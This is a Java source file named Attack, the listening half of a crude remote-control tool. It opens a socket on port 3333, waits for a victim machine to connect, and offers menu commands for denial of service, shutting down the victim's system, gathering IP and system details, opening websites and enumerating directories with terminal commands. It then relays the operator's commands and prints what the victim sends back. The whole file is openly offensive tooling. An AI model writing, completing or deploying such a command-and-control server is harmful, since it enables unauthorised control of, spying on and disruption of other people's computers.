import java.net.*;
import java.io.*;
public class Attack {
	//web_url : https://wallpapershome.com/images/wallpapers/sky-3840x2160-4k-hd-wallpaper-clouds-sunset-sunrise-water-blue-sea-589.jpg
	public static void main(String[] args) throws Exception {
		ServerSocket ss=new ServerSocket(3333);
		Socket s=ss.accept();
		System.out.println("----------ATTACKING----------");
		System.out.println("1.'dos' [making the victim's system unavailable]");
		System.out.println("2.'shut' [shutdown thw victim's system]");
		System.out.println("----------INFORMAION GATHERING----------");
		System.out.println("1.'ip' [Gathering all details about the ip]");
		System.out.println("2.'syspec' [Gathering all the System details]");
		System.out.println("3.'open website' [Enter the URL of the website]");
		System.out.println("4.'directory enumaration' ['dir`'+ terminal commonds]");
		DataInputStream din=new DataInputStream(s.getInputStream());
		DataOutputStream dout=new DataOutputStream(s.getOutputStream());
		BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
		String vic="",att="";
		while(!att.equals("stop")) {
			att=br.readLine();
			dout.writeUTF(att);
			if(att.equals("dos")|| att.equals("shut") || att.equals("ip") || att.equals("syspec") || att.length()>5 || att.contains("dir") ) {
				vic=din.readUTF();
				System.out.println(vic);
			}
			dout.flush();
			
		}
		din.close();
		s.close();
		ss.close();
	}

}
